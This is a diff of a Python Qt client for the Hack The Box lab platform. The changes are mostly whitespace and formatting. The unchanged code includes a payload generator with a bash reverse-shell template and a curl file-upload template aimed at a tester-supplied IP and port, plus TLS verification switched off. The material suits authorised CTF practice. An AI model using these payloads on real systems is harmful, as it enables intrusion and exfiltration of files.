@@ -8,7 +8,6 @@ from dotenv import load_dotenv
 from functools import partial
 from html import escape
 import json
-
 from PySide6.QtWidgets import (
     QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
     QLabel, QPushButton, QComboBox, QLineEdit, QTextEdit, QFrame,
@@ -26,7 +25,6 @@ from PySide6.QtCore import (
 )
 from PySide6.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply
 from PySide6.QtNetwork import QNetworkProxy, QSslConfiguration, QSslSocket
-
 from PySide6.QtCore import Qt, QSize
 from PySide6.QtGui import QFont, QColor, QPainter, QPainterPath, QPixmap, QFontMetrics
 from PySide6.QtWidgets import (
@@ -36,22 +34,16 @@ from PySide6.QtWidgets import (
     QTableWidgetItem,
     QHeaderView,
 )
-
-
 load_dotenv()
 token = os.getenv("TOKEN")
-
 if not token:
     QMessageBox.critical(None, "Error", "Token not defined in .env file")
     exit()
-
 headers = {
     "Authorization": f"Bearer {token}",
     "User-Agent": "Mozilla/5.0",
     "Accept": "application/json, text/plain, */*",
 }
-
-
 list_machines_url = "https://labs.hackthebox.com/api/v4/season/machines"
 activate_machine_url = "https://labs.hackthebox.com/api/v4/vm/spawn"
 status_machine_url = "https://labs.hackthebox.com/api/v4/machine/profile"
@@ -87,18 +79,14 @@ class HTBApiClient(QObject):
 
     def __init__(self, token):
         super().__init__()
-
         # proxy = QNetworkProxy()
         # proxy.setType(QNetworkProxy.HttpProxy)
         # proxy.setHostName("127.0.0.1")
         # proxy.setPort(8080)
-
         self.nam = QNetworkAccessManager()
         # self.nam.setProxy(proxy)
-
         self.ssl_config = QSslConfiguration.defaultConfiguration()
         self.ssl_config.setPeerVerifyMode(QSslSocket.VerifyNone)
-
         self.base_url = "https://labs.hackthebox.com/api/v4"
         self.headers = {
             "Authorization": f"Bearer {token}",
@@ -110,7 +98,6 @@ class HTBApiClient(QObject):
         url = f"https://labs.hackthebox.com{avatar_path}"
         request = QNetworkRequest(QUrl(url))
         self._configure_request(request)
-
         reply = self.nam.get(request)
         reply.user_id = user_id
         reply.finished.connect(lambda: self._handle_avatar_reply(reply))
@@ -126,7 +113,6 @@ class HTBApiClient(QObject):
         url = QUrl(f"{self.base_url}/machine/activity/{machine_id}")
         request = QNetworkRequest(url)
         self._configure_request(request)
-
         reply = self.nam.get(request)
         reply.finished.connect(lambda: self._handle_flag_activity(reply))
 
@@ -150,10 +136,8 @@ class HTBApiClient(QObject):
         self._configure_request(request)
         request.setHeader(QNetworkRequest.ContentTypeHeader,
                           "application/json")
-
         payload = {"machine_id": machine_id}
         json_data = json.dumps(payload).encode()
-
         reply = self.nam.post(request, json_data)
         reply.finished.connect(
             lambda: self._handle_reset_response(reply, machine_id))
@@ -164,7 +148,6 @@ class HTBApiClient(QObject):
                 "success": False,
                 "machine_id": machine_id
             }
-
             if reply.error() == QNetworkReply.NoError:
                 data = json.loads(reply.readAll().data())
                 response.update({
@@ -173,9 +156,7 @@ class HTBApiClient(QObject):
                 })
             else:
                 response["error"] = reply.errorString()
-
             self.machine_reset.emit(response)
-
         except Exception as e:
             self.api_error.emit(f"Reset error: {str(e)}")
         finally:
@@ -187,7 +168,6 @@ class HTBApiClient(QObject):
                 "success": False,
                 "machine_id": machine_id
             }
-
             if reply.error() == QNetworkReply.NoError:
                 data = json.loads(reply.readAll().data())
                 response.update({
@@ -196,9 +176,7 @@ class HTBApiClient(QObject):
                 })
             else:
                 response["error"] = reply.errorString()
-
             self.flag_submitted.emit(response)
-
         except Exception as e:
             self.api_error.emit(f"Submit error: {str(e)}")
         finally:
@@ -210,13 +188,11 @@ class HTBApiClient(QObject):
         self._configure_request(request)
         request.setHeader(QNetworkRequest.ContentTypeHeader,
                           "application/json")
-
         payload = {
             "machine_id": machine_id,
             "flag": flag
         }
         json_data = json.dumps(payload).encode()
-
         reply = self.nam.post(request, json_data)
         reply.finished.connect(
             lambda: self._handle_submit_response(reply, machine_id))
@@ -225,7 +201,6 @@ class HTBApiClient(QObject):
         url = QUrl(f"{self.base_url}/machine/profile/{machine_id}")
         request = QNetworkRequest(url)
         self._configure_request(request)
-
         reply = self.nam.get(request)
         reply.finished.connect(lambda: self._handle_machine_info(reply))
 
@@ -233,7 +208,6 @@ class HTBApiClient(QObject):
         url = QUrl(f"{self.base_url}/machine/profile/{machine_id}")
         request = QNetworkRequest(url)
         self._configure_request(request)
-
         reply = self.nam.get(request)
         reply.finished.connect(lambda: self._handle_status_response(reply))
 
@@ -255,10 +229,8 @@ class HTBApiClient(QObject):
         self._configure_request(request)
         request.setHeader(QNetworkRequest.ContentTypeHeader,
                           "application/json")
-
         payload = {"machine_id": machine_id}
         json_data = json.dumps(payload).encode()
-
         reply = self.nam.post(request, json_data)
         reply.finished.connect(
             lambda: self._handle_stop_response(reply, machine_id))
@@ -269,7 +241,6 @@ class HTBApiClient(QObject):
                 "success": False,
                 "machine_id": machine_id
             }
-
             if reply.error() == QNetworkReply.NoError:
                 data = json.loads(reply.readAll().data())
                 response.update({
@@ -278,9 +249,7 @@ class HTBApiClient(QObject):
                 })
             else:
                 response["error"] = reply.errorString()
-
             self.machine_stopped.emit(response)
-
         except Exception as e:
             self.api_error.emit(f"Stop error: {str(e)}")
         finally:
@@ -292,10 +261,8 @@ class HTBApiClient(QObject):
         request.setHeader(QNetworkRequest.ContentTypeHeader,
                           "application/json")
         self._configure_request(request)
-
         payload = {"machine_id": machine_id}
         data = QByteArray(json.dumps(payload).encode())
-
         reply = self.nam.post(request, data)
         reply.finished.connect(
             lambda: self._handle_activate_response(reply, machine_id))
@@ -328,7 +295,6 @@ class HTBApiClient(QObject):
         url = QUrl(f"{self.base_url}/machine/owns/top/{machine_id}")
         request = QNetworkRequest(url)
         self._configure_request(request)
-
         reply = self.nam.get(request)
         reply.finished.connect(lambda: self._handle_activity(reply))
 
@@ -361,7 +327,6 @@ class HTBApiClient(QObject):
         url = QUrl(f"{self.base_url}/machine/paginated")
         request = QNetworkRequest(url)
         self._configure_request(request)
-
         reply = self.nam.get(request)
         reply.finished.connect(lambda: self._handle_list_machines(reply))
 
@@ -399,11 +364,9 @@ class ActivityThread(QThread):
         url = QUrl(f"{self.api.base_url}/machine/owns/top/{self.machine_id}")
         request = QNetworkRequest(url)
         self.api._configure_request(request)
-
         reply = self.api.nam.get(request)
         reply.finished.connect(lambda: loop.quit())
         loop.exec()
-
         if reply.error() == QNetworkReply.NoError:
             data = json.loads(reply.readAll().data())
             self.activity_data.emit(data.get("info", []))
@@ -445,7 +408,6 @@ class NetworkManager(QObject):
 class HTBCommander(QMainWindow):
     def __init__(self):
         super().__init__()
-
         self.api = HTBApiClient(token)
         self.machine_dict = {}
         self.current_machine_id = None
@@ -455,15 +417,11 @@ class HTBCommander(QMainWindow):
         self.animation_timer = None
         self.avatar_labels = {}
         self._setup_signal_connections()
-
         self._setup_palette()
         self._setup_ui()
-
         self._setup_timers()
-
         self._load_machines()
         self._setup_clipboard_monitor()
-
         self.status_led.setStyleSheet("color: #ff4444;")
 
     def _setup_signal_connections(self):
@@ -481,14 +439,11 @@ class HTBCommander(QMainWindow):
 
     def _setup_timers(self):
         """Configurar todos los timers"""
-
         QTimer.singleShot(0, self._update_activity)
         QTimer.singleShot(0, self._update_release_timer)
-
         self.flag_activity_timer = QTimer()
         self.flag_activity_timer.timeout.connect(self._refresh_flag_activity)
         self.flag_activity_timer.start(10000)
-
         self.status_check_timer = QTimer()
         self.status_check_timer.timeout.connect(self._check_machine_status)
         self.status_check_attempts = 0
@@ -504,19 +459,15 @@ class HTBCommander(QMainWindow):
         selected = self.machine_combo.currentText()
         if selected and selected in self.machine_dict:
             self.current_machine_id = self.machine_dict[selected]["id"]
-
             self._set_default_status()
             self.flag_table.setRowCount(0)
             self.activity_table.setRowCount(0)
-
             self.api.get_machine_info(self.current_machine_id)
             self.api.get_machine_activity(self.current_machine_id)
             self._refresh_flag_activity()
-
             machine_data = self.machine_dict[selected]
             if "avatar_url" in machine_data:
                 self._load_avatar(machine_data["avatar_url"])
-
             self.status_check_attempts = 0
 
     def closeEvent(self, event):
@@ -527,7 +478,6 @@ class HTBCommander(QMainWindow):
             self.flag_activity_timer.stop()
         if self.status_check_timer.isActive():
             self.status_check_timer.stop()
-
         super().closeEvent(event)
 
     def _setup_palette(self):
@@ -536,7 +486,6 @@ class HTBCommander(QMainWindow):
         panel_bg = QColor("#1e222a")
         text_color = QColor("#e0e0e0")
         accent_color = QColor("#4cc38a")
-
         palette.setColor(QPalette.Window, bg_color)
         palette.setColor(QPalette.WindowText, text_color)
         palette.setColor(QPalette.Base, panel_bg)
@@ -551,27 +500,21 @@ class HTBCommander(QMainWindow):
     def _setup_ui(self):
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
-
         main_layout = QHBoxLayout(central_widget)
         main_layout.setContentsMargins(10, 10, 10, 10)
         main_layout.setSpacing(10)
-
         right_panel = QFrame()
         right_panel.setFrameShape(QFrame.StyledPanel)
         right_layout = QVBoxLayout(right_panel)
         right_layout.setContentsMargins(5, 5, 5, 5)
-
         self._setup_console_activity(right_layout)
         self._setup_machine_info(right_layout)
-
         left_panel = QFrame()
         left_panel.setFrameShape(QFrame.StyledPanel)
         left_layout = QVBoxLayout(left_panel)
         left_layout.setContentsMargins(5, 5, 5, 5)
-
         self._setup_machine_control(left_layout)
         self._setup_payload_generator(left_layout)
-
         main_layout.addWidget(left_panel, 1)
         main_layout.addWidget(right_panel, 2)
 
@@ -579,13 +522,10 @@ class HTBCommander(QMainWindow):
         frame = QFrame()
         self.machine_combo = QComboBox()
         self.machine_combo.setFont(QFont("Iosevka Nerd Font", 12))
-
         frame_layout = QVBoxLayout(frame)
-
         title = QLabel("Machines Control")
         title.setFont(QFont("Iosevka Nerd Font", 16, QFont.Bold))
         frame_layout.addWidget(title)
-
         frame_layout.addWidget(self.machine_combo)
         btn_layout = QHBoxLayout()
         controls = ["⟳ Refresh", "▶ Spawn", "⏹ Stop", "🔄 Reset"]
@@ -596,15 +536,12 @@ class HTBCommander(QMainWindow):
             btn.clicked.connect(partial(self._handle_machine_action, text))
             btn_layout.addWidget(btn)
         frame_layout.addLayout(btn_layout)
-
         auto_frame = QFrame()
         auto_layout = QHBoxLayout(auto_frame)
         self.status_led = QLabel("●")
         self.status_led.setFont(QFont("Arial", 14))
-
         self.status_led.setStyleSheet("color: #ff4444;")
         auto_layout.addWidget(self.status_led)
-
         auto_btn = QPushButton("Auto-Submit Flag")
         auto_btn.setFont(QFont("Iosevka Nerd Font", 12))
         auto_btn.clicked.connect(self._toggle_auto_submit)
@@ -617,17 +554,14 @@ class HTBCommander(QMainWindow):
     def _setup_payload_generator(self, layout):
         frame = QFrame()
         frame_layout = QVBoxLayout(frame)
-
         title = QLabel("Payload Generator")
         title.setFont(QFont("Iosevka Nerd Font", 16, QFont.Bold))
         frame_layout.addWidget(title)
-
         self.payload_category = QComboBox()
         self.payload_name = QComboBox()
         self.encoding_combo = QComboBox()
         self.payload_ip = QLineEdit()
         self.payload_port = QLineEdit()
-
         self.payloads = {
             "Reverse Shells": {
                 "bash": 'setsid /bin/bash -c "/bin/bash &>/dev/tcp/{IP}/{PORT} 0>&1"',
@@ -657,16 +591,13 @@ elif command -v script; then
                 "uploadserver Upload": "curl -F files=@file.txt http://{IP}:{PORT}/upload"
             }
         }
-
         self.payload_category.addItems(self.payloads.keys())
         self.payload_category.currentIndexChanged.connect(
             self._update_payload_list)
-
         self.encoding_combo.addItems(
             ["None", "Base64", "URL Encode", "Base64 utf-16le"])
         self.payload_ip.setText(get_tun0_ip())
         self.payload_port.setText("1337")
-
         form_items = [
             ("Category:", self.payload_category),
             ("Type:", self.payload_name),
@@ -674,7 +605,6 @@ elif command -v script; then
             ("IP Address:", self.payload_ip),
             ("Port:", self.payload_port),
         ]
-
         for label, widget in form_items:
             row = QHBoxLayout()
             lbl = QLabel(label)
@@ -682,26 +612,21 @@ elif command -v script; then
             row.addWidget(lbl)
             row.addWidget(widget)
             frame_layout.addLayout(row)
-
         self.payload_name.currentIndexChanged.connect(self._generate_payload)
         self.payload_ip.textChanged.connect(self._generate_payload)
         self.payload_port.textChanged.connect(self._generate_payload)
         self.encoding_combo.currentIndexChanged.connect(self._generate_payload)
-
         preview_label = QLabel("Preview:")
         preview_label.setFont(QFont("Iosevka Nerd Font", 12, QFont.Bold))
         frame_layout.addWidget(preview_label)
-
         self.payload_text = QTextEdit()
         self.payload_text.setFont(QFont("Consolas", 12))
         self.payload_text.setReadOnly(True)
         frame_layout.addWidget(self.payload_text)
-
         copy_btn = QPushButton("📋 Copy Payload")
         copy_btn.setFont(QFont("Iosevka Nerd Font", 12))
         copy_btn.clicked.connect(self._copy_payload)
         frame_layout.addWidget(copy_btn)
-
         self._update_payload_list()
         layout.addSpacing(15)
         layout.addWidget(frame)
@@ -720,15 +645,12 @@ elif command -v script; then
                 color: #e0e0e0;
             }
         """)
-
         frame_layout = QVBoxLayout(frame)
         frame_layout.setContentsMargins(5, 5, 5, 5)
-
         title = QLabel("📑 Recent Flag Submissions")
         title.setFont(QFont("Iosevka Nerd Font", 12, QFont.Bold))
         title.setStyleSheet("color: #e0e0e0; margin-bottom: 8px;")
         frame_layout.addWidget(title)
-
         self.flag_table = QTableWidget()
         self.flag_table.setColumnCount(3)
         self.flag_table.setHorizontalHeaderLabels(["USER", "TYPE", "TIME"])
@@ -736,7 +658,6 @@ elif command -v script; then
         self.flag_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
         self.flag_table.setSelectionBehavior(QAbstractItemView.SelectRows)
         self.flag_table.setShowGrid(False)
-
         self.flag_table.setStyleSheet("""
             QTableWidget {
                 background-color: #1e222a;
@@ -767,35 +688,29 @@ elif command -v script; then
                 background: #4cc38a;
             }
         """)
-
         self.flag_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
         self.flag_table.horizontalHeader().setSectionResizeMode(
             1, QHeaderView.ResizeToContents)
         self.flag_table.horizontalHeader().setSectionResizeMode(
             2, QHeaderView.ResizeToContents)
         self.flag_table.verticalHeader().setDefaultSectionSize(40)
-
         frame_layout.addWidget(self.flag_table)
         layout.addWidget(frame)
 
     def _update_flag_activity(self, activity_data):
         self.flag_table.setRowCount(len(activity_data))
-
-        for row, entry in enumerate(activity_data):
+        for row, entry in enumerate(activity_data[::-1]):
             user_widget = QWidget()
             user_layout = QHBoxLayout(user_widget)
             user_layout.setContentsMargins(8, 2, 8, 2)
             user_layout.setSpacing(10)
             user_layout.setAlignment(Qt.AlignVCenter)
-
             avatar_label = QLabel()
             avatar_label.setFixedSize(40, 40)
             avatar_label.setAlignment(Qt.AlignCenter)
             self.avatar_labels[entry["user_id"]] = avatar_label
-
             if entry.get("user_avatar"):
                 self.api.get_avatar(entry["user_id"], entry["user_avatar"])
-
             name_label = QLabel(entry["user_name"])
             name_label.setStyleSheet("""
                 QLabel {
@@ -806,29 +721,24 @@ elif command -v script; then
             """)
             name_label.setSizePolicy(
                 QSizePolicy.Expanding, QSizePolicy.Preferred)
-
             user_layout.addWidget(avatar_label)
             user_layout.addWidget(name_label)
             user_layout.addStretch()
-
             if entry.get("blood_type") == "root":
                 flag_type = "🩸 Root"
             elif entry.get("blood_type") == "user":
                 flag_type = "🩸 User"
             else:
                 flag_type = entry.get("type", "N/A")
-
             try:
                 dt = datetime.strptime(
                     entry["created_at"], "%Y-%m-%dT%H:%M:%S.%fZ")
                 time_str = dt.strftime("%H:%M")
             except:
                 time_str = "N/A"
-
             self.flag_table.setCellWidget(row, 0, user_widget)
             self.flag_table.setItem(row, 1, self._create_table_item(flag_type))
             self.flag_table.setItem(row, 2, self._create_table_item(time_str))
-
         self.flag_table.verticalHeader().setDefaultSectionSize(40)
         self.flag_table.resizeRowsToContents()
 
@@ -838,24 +748,19 @@ elif command -v script; then
             if not pixmap.loadFromData(image_data):
                 print(f"[!] Falló al cargar avatar de {user_id}")
                 return
-
             target_size = 40
-
             scaled_pix = pixmap.scaled(
                 target_size, target_size,
                 Qt.KeepAspectRatio,
                 Qt.SmoothTransformation
             )
-
             final_pixmap = QPixmap(target_size, target_size)
             final_pixmap.fill(Qt.transparent)
-
             painter = QPainter(final_pixmap)
             x_offset = (target_size - scaled_pix.width()) // 2
             y_offset = (target_size - scaled_pix.height()) // 2
             painter.drawPixmap(x_offset, y_offset, scaled_pix)
             painter.end()
-
             self.avatar_labels[user_id].setPixmap(final_pixmap)
 
     def _create_table_item(self, text, alignment=Qt.AlignCenter):
@@ -896,37 +801,29 @@ elif command -v script; then
             }
         """)
         grid = QGridLayout(frame)
-
         self.status_labels = {}
         fields = [
             ("IP Address:", "ip", 1),
             ("Type:", "type", 2),
             ("Release:", "expires_at", 3),
         ]
-
         avatar_name_layout = QHBoxLayout()
         avatar_name_layout.setContentsMargins(0, 0, 0, 0)
         avatar_name_layout.setSpacing(10)
         avatar_name_layout.setAlignment(Qt.AlignLeft)
-
-        # avatar
         self.avatar_label = QLabel()
-        self.avatar_label.setFixedSize(64, 64)  # más equilibrado
-        self.avatar_label.setStyleSheet("border: none; margin: 0px; padding: 0px; background-color: transparent;")
+        self.avatar_label.setFixedSize(64, 64)
+        self.avatar_label.setStyleSheet(
+            "border: none; margin: 0px; padding: 0px; background-color: transparent;")
         self.avatar_label.setAlignment(Qt.AlignCenter)
         avatar_name_layout.addWidget(self.avatar_label)
-
-        # nombre de la maquina
         self.machine_name_label = QLabel("Machine Name")
-        self.machine_name_label.setFont(QFont("Iosevka Nerd Font", 18, QFont.Bold))
+        self.machine_name_label.setFont(
+            QFont("Iosevka Nerd Font", 18, QFont.Bold))
         self.machine_name_label.setStyleSheet("color: #4cc38a;")
         self.machine_name_label.setAlignment(Qt.AlignVCenter | Qt.AlignLeft)
         avatar_name_layout.addWidget(self.machine_name_label)
-
-        # inserto la grilla arriba de todo
         grid.addLayout(avatar_name_layout, 0, 0, 1, 2)
-
-
         for label, key, row in fields:
             lbl = QLabel(label)
             lbl.setFont(QFont("Iosevka Nerd Font", 12, QFont.Bold))
@@ -936,16 +833,12 @@ elif command -v script; then
             grid.addWidget(lbl, row, 0)
             grid.addWidget(value, row, 1)
             self.status_labels[key] = value
-
         self.copy_ip_btn = QPushButton("📋 Copiar IP")
         self.copy_ip_btn.setFont(QFont("Iosevka Nerd Font", 11))
         self.copy_ip_btn.setFixedWidth(120)
         self.copy_ip_btn.clicked.connect(self._copy_ip)
         self.copy_ip_btn.setEnabled(False)
-
         grid.addWidget(self.copy_ip_btn, 4, 0, 1, 2, alignment=Qt.AlignLeft)
-
-
         flag_frame = QFrame()
         flag_layout = QHBoxLayout(flag_frame)
         self.flag_entry = QLineEdit()
@@ -976,12 +869,10 @@ elif command -v script; then
         flag_layout.addWidget(self.flag_entry)
         flag_layout.addWidget(submit_btn)
         grid.addWidget(flag_frame, 4, 0, 1, 3)
-
         layout.addWidget(frame)
 
     def _setup_console_activity(self, layout):
         splitter = QSplitter(Qt.Vertical)
-
         self.activity_table = QTableWidget()
         self.activity_table.setStyleSheet("""
             QTableWidget {
@@ -1019,7 +910,6 @@ elif command -v script; then
                 background: none;
             }
         """)
-
         self.activity_table.verticalHeader().setVisible(False)
         self.activity_table.setColumnCount(6)
         self.activity_table.setHorizontalHeaderLabels(
@@ -1037,7 +927,6 @@ elif command -v script; then
             4, QHeaderView.ResizeToContents)
         self.activity_table.horizontalHeader().setSectionResizeMode(
             5, QHeaderView.ResizeToContents)
-
         self.console = QTextBrowser()
         self.console.setStyleSheet("""
             QTextBrowser {
@@ -1048,11 +937,9 @@ elif command -v script; then
                 font-size: 12px;
             }
         """)
-
         splitter.addWidget(self.activity_table)
         splitter.addWidget(self.console)
         splitter.setSizes([300, 100])
-
         layout.addWidget(splitter)
 
     def _copy_ip(self):
@@ -1071,29 +958,23 @@ elif command -v script; then
             self.payload_name.clear()
             payload_names = list(self.payloads[category].keys())
             self.payload_name.addItems(payload_names)
-
             if payload_names:
                 self.payload_name.setCurrentIndex(0)
             else:
                 self.payload_text.clear()
-
             self._generate_payload()
 
     def _generate_payload(self):
         try:
             category = self.payload_category.currentText()
             name = self.payload_name.currentText()
-
             if not name:
                 self.payload_text.clear()
                 return
-
             ip = self.payload_ip.text()
             port = self.payload_port.text()
-
             template = self.payloads[category][name]
             payload = template.replace("{IP}", ip).replace("{PORT}", port)
-
             encoding = self.encoding_combo.currentText()
             if encoding == "Base64":
                 payload = base64.b64encode(payload.encode()).decode()
@@ -1101,9 +982,7 @@ elif command -v script; then
                 payload = quote(payload)
             elif encoding == "Base64 utf-16le":
                 payload = base64.b64encode(payload.encode("utf-16le")).decode()
-
             self.payload_text.setPlainText(payload)
-
         except Exception as e:
             self._log_to_console(
                 f"Error generating payload: {str(e)}", error=True)
@@ -1113,7 +992,6 @@ elif command -v script; then
         if not selected or selected not in self.machine_dict:
             self._log_to_console("No machine selected", error=True)
             return
-
         machine_id = self.machine_dict[selected]["id"]
         self.api.stop_machine(machine_id)
         self._log_to_console(f"Stopping machine {selected}...")
@@ -1131,7 +1009,6 @@ elif command -v script; then
         if not selected:
             QMessageBox.critical(self, "Error", "Select a machine first")
             return
-
         machine_id = self.machine_dict[selected]["id"]
         self.api.reset_machine(machine_id)
         self._log_to_console(f"Restarting machine {selected}...")
@@ -1151,10 +1028,8 @@ elif command -v script; then
     def _time_until_release(self, release_time):
         now = datetime.now(timezone.utc)
         delta = release_time - now
-
         if delta.total_seconds() <= 0:
             return "¡Released!"
-
         days = delta.days
         hours, rem = divmod(delta.seconds, 3600)
         minutes, seconds = divmod(rem, 60)
@@ -1181,14 +1056,11 @@ elif command -v script; then
             self.machine_dict = {m["name"]: m for m in machines}
             self.machine_combo.clear()
             self.machine_combo.addItems(self.machine_dict.keys())
-
             if self.machine_combo.count() > 0:
                 self.machine_combo.setCurrentIndex(0)
                 self._on_machine_selected(0)
-
             self.payload_ip.setText(get_tun0_ip())
             self._log_to_console(f"Loaded {len(machines)} machines")
-
         except Exception as e:
             self._log_to_console(
                 f"Error loading machines: {str(e)}", error=True)
@@ -1208,20 +1080,16 @@ elif command -v script; then
         if not selected:
             QMessageBox.critical(self, "Error", "Select a machine first")
             return
-
         self._start_animation("Spawning")
         self.copy_ip_btn.setEnabled(False)
         machine_id = self.machine_dict[selected]["id"]
         self.api.activate_machine(machine_id)
-
         self.status_check_attempts = 0
         self._start_status_check(machine_id)
 
     def _start_status_check(self, machine_id):
-
         if self.status_check_timer and self.status_check_timer.isActive():
             self.status_check_timer.stop()
-
         self.status_check_timer = QTimer()
         self.status_check_timer.timeout.connect(
             lambda: self._check_machine_status(machine_id))
@@ -1229,38 +1097,30 @@ elif command -v script; then
 
     def _check_machine_status(self, machine_id):
         self.status_check_attempts += 1
-
         if self.status_check_attempts > self.max_status_attempts:
             self._stop_animation()
             self.status_check_timer.stop()
             self._log_to_console("Timeout waiting for IP", error=True)
             return
-
         self.api.get_machine_info(machine_id)
 
     def _update_status_labels(self, status):
         ip = status.get("ip", "N/A")
         self.status_labels["ip"].setText(ip)
-
         if ip not in ["N/A", "null", "", None]:
             self._stop_animation()
             self.copy_ip_btn.setEnabled(True)
             if self.status_check_timer:
                 self.status_check_timer.stop()
-        
         self.machine_name_label.setText(status.get("name", "N/A"))
-                
         avatar_url = status.get("avatar", "")
         self.current_machine_data = {
             "id": status.get("id"),
             "name": status.get("name"),
             "avatar": avatar_url
         }
-
-        # Change: cargo avatar desde la URL
         self._load_machine_avatar(avatar_url)
         self.status_labels["type"].setText(status.get("os", "N/A"))
-
         expires = status.get("playInfo", {}).get("expires_at")
         if expires:
             self.status_labels["expires_at"].setText(
@@ -1284,7 +1144,6 @@ elif command -v script; then
     def _check_ip_status(self, machine_id, attempts=0):
         if attempts >= 600:
             return
-
         self.api.get_machine_status(machine_id)
         QTimer.singleShot(5000, lambda: self._check_ip_status(
             machine_id, attempts + 1))
@@ -1297,7 +1156,6 @@ elif command -v script; then
         if not url:
             self.avatar_label.clear()
             return
-
         network_manager = QNetworkAccessManager()
         request = QNetworkRequest(QUrl(url))
         reply = network_manager.get(request)
@@ -1310,17 +1168,14 @@ elif command -v script; then
                 self.avatar_label.setPixmap(pixmap.scaled(
                     80, 80, Qt.KeepAspectRatio, Qt.SmoothTransformation))
             reply.deleteLater()
-
         reply.finished.connect(handle_reply)
 
     def _update_avatar(self, user_id, image_data):
         if user_id in self.avatar_labels:
             pixmap = QPixmap()
             pixmap.loadFromData(image_data)
-
             circular_pixmap = QPixmap(40, 40)
             circular_pixmap.fill(Qt.transparent)
-
             painter = QPainter(circular_pixmap)
             painter.setRenderHints(
                 QPainter.Antialiasing | QPainter.SmoothPixmapTransform)
@@ -1329,14 +1184,12 @@ elif command -v script; then
             painter.setClipPath(path)
             painter.drawPixmap(0, 0, 40, 40, pixmap)
             painter.end()
-
             self.avatar_labels[user_id].setPixmap(circular_pixmap)
 
     def _load_machine_avatar(self, url):
         if not url:
             self.avatar_label.clear()
             return
-
         request = QNetworkRequest(QUrl(f"https://labs.hackthebox.com{url}"))
         reply = self.api.nam.get(request)
 
@@ -1346,14 +1199,13 @@ elif command -v script; then
                 pixmap = QPixmap()
                 pixmap.loadFromData(data)
                 self.avatar_label.setPixmap(
-                    pixmap.scaled(60, 60, Qt.KeepAspectRatio, Qt.SmoothTransformation)
+                    pixmap.scaled(60, 60, Qt.KeepAspectRatio,
+                                  Qt.SmoothTransformation)
                 )
             else:
                 print(f"[!] Error al cargar avatar: {reply.errorString()}")
             reply.deleteLater()
-
         reply.finished.connect(handle_reply)
-
 
     def _start_animation(self, text):
         self.animation_text = text
@@ -1383,7 +1235,6 @@ elif command -v script; then
     def _check_clipboard(self):
         if not self.auto_submit_enabled:
             return
-
         text = self.clipboard.text().strip()
         if text != self.last_clipboard_text and self._is_valid_flag(text):
             self._handle_clipboard_flag(text)
@@ -1401,7 +1252,6 @@ elif command -v script; then
             if selected:
                 machine_id = self.machine_dict[selected]["id"]
                 self._fetch_activity_data(machine_id)
-
             QTimer.singleShot(25000, self._update_activity)
         except Exception as e:
             self._log_to_console(f"Activity error: {str(e)}", error=True)
@@ -1417,44 +1267,34 @@ elif command -v script; then
 
     def _update_activity_table(self, activity_data):
         self.avatar_labels = {}
-
         self.activity_table.blockSignals(True)
         self.activity_table.setUpdatesEnabled(False)
-
         self._safe_clear_table(self.activity_table)
-
         if self.activity_table.rowCount() != len(activity_data):
             self.activity_table.setRowCount(len(activity_data))
-
         if hasattr(self.api, 'pending_avatar_requests'):
             for reply in self.api.pending_avatar_requests:
                 reply.abort()
                 reply.deleteLater()
             self.api.pending_avatar_requests = []
-
         self.activity_table.setShowGrid(False)
         self.activity_table.verticalHeader().setVisible(False)
         self.activity_table.verticalHeader().setDefaultSectionSize(48)
-
         for row, entry in enumerate(activity_data):
             if not entry or not isinstance(entry, dict):
                 continue
-
             try:
                 user_id = entry.get("id")
                 if not user_id:
                     continue
-
                 name_widget = QWidget()
                 layout = QHBoxLayout(name_widget)
                 layout.setContentsMargins(4, 2, 4, 2)
                 layout.setSpacing(6)
-
                 avatar_label = QLabel()
                 avatar_label.setFixedSize(40, 40)
                 avatar_label.setProperty("user_id", user_id)
                 self.avatar_labels[user_id] = avatar_label
-
                 name_label = QLabel()
                 font = name_label.font()
                 font_metrics = QFontMetrics(font)
@@ -1464,23 +1304,19 @@ elif command -v script; then
                 name_label.setStyleSheet("color: white;")
                 name_label.setSizePolicy(
                     QSizePolicy.Expanding, QSizePolicy.Preferred)
-
                 layout.addWidget(avatar_label)
                 layout.addWidget(name_label)
                 self.activity_table.setCellWidget(row, 1, name_widget)
-
                 if row < self.activity_table.rowCount():
                     avatar_path = entry.get("avatar", "")
                     if avatar_path:
                         self.api.get_avatar(user_id, avatar_path)
-
                 columns = [
                     ("position", "-"),
                     ("rank_text", "-"),
                     ("user_own_time", "0h 0m"),
                     ("root_own_time", "0h 0m")
                 ]
-
                 for col_idx, (key, default) in enumerate(columns):
                     if col_idx == 0:
                         value = str(entry.get(key, default))
@@ -1489,16 +1325,13 @@ elif command -v script; then
                         item.setTextAlignment(Qt.AlignCenter)
                         self.activity_table.setItem(row, 0, item)
                         continue
-
                     value = str(entry.get(key, default))
                     if "own_time" in key:
                         value = value.replace("H", "h ").replace("M", "m ")
-
                     item = QTableWidgetItem(value)
                     item.setForeground(QColor("white"))
                     item.setTextAlignment(Qt.AlignCenter)
                     self.activity_table.setItem(row, col_idx + 1, item)
-
                 blood_item = QTableWidgetItem()
                 blood_text = "\U0001FA78" * \
                     sum([entry.get("is_user_blood", False),
@@ -1509,11 +1342,9 @@ elif command -v script; then
                 blood_item.setText(blood_text)
                 blood_item.setTextAlignment(Qt.AlignCenter)
                 self.activity_table.setItem(row, 5, blood_item)
-
             except Exception as e:
                 print(f"Error en fila {row}: {str(e)}")
                 continue
-
         self.activity_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
         self.activity_table.viewport().update()
         self.activity_table.setUpdatesEnabled(True)
@@ -1523,7 +1354,6 @@ elif command -v script; then
         self.auto_submit_enabled = not self.auto_submit_enabled
         color = "#4cc38a" if self.auto_submit_enabled else "#ff4444"
         self.status_led.setStyleSheet(f"color: {color};")
-
         if self.auto_submit_enabled:
             self.clipboard_timer = QTimer()
             self.clipboard_timer.timeout.connect(self._check_clipboard)
@@ -1538,12 +1368,10 @@ elif command -v script; then
         if not selected:
             QMessageBox.critical(self, "Error", "Select a machine first")
             return
-
         flag = self.flag_entry.text().strip()
         if not flag:
             QMessageBox.critical(self, "Error", "Enter a flag")
             return
-
         machine_id = self.machine_dict[selected]["id"]
         self.api.submit_flag(machine_id, flag)
 
@@ -1561,7 +1389,6 @@ if __name__ == "__main__":
         "fonts/IosevkaNerdFont-Regular.ttf")
